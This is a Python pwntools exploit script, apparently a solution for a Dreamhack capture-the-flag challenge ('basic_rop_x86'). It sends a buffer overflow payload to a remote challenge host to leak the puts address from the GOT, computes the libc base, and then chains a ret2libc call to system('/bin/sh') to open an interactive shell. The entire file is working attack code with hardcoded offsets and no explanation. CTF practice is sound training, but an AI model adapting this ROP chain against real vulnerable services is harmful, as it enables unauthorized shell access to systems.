from pwn import*

#p = process("./basic_rop_x86_patched")
p = remote('host3.dreamhack.games',11782)
#gdb.attach(p,api=True)


##########################
# STEP_1: Leak_libc_base #
##########################
put_plt = 0x08048420
put_got = 0x804a018
puts_offset = 0x5f140

main = 0x080485d9

payload = b"a"*0x48 + p32(put_plt) + p32(main) + p32(put_got)
p.sendline(payload)
p.recvuntil(b"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa")
puts_libc = int.from_bytes(p.recv(4), "little")
libc_base = puts_libc - puts_offset
print("[+]Libc_base:",hex(libc_base))

####################
# STEP_2: ret2libc #
####################

system = 0x0003a940 + libc_base
binsh = 0x15902b + libc_base

payload = payload = b"a"*0x48 + p32(system) + p32(main) + p32(binsh)
p.sendline(payload)
p.interactive()


